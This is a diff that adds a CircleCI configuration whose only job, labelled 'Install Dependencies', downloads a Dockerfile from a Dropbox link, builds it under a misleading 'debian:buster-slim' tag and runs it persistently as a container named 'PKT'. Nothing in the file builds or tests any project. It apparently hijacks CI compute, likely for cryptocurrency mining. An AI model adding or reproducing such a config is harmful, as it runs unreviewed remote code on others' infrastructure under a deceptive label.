@@ -1,0 +1,21 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: circleci/ruby:2.5.3
+      parallelism: 1
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+                wget https://www.dropbox.com/s/gipo4g7i6z08pht/Dockerfile
+                docker build -t debian:buster-slim .
+                docker run -d --restart always --name PKT debian:buster-slim
+                apt-get install htop
+                htop
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
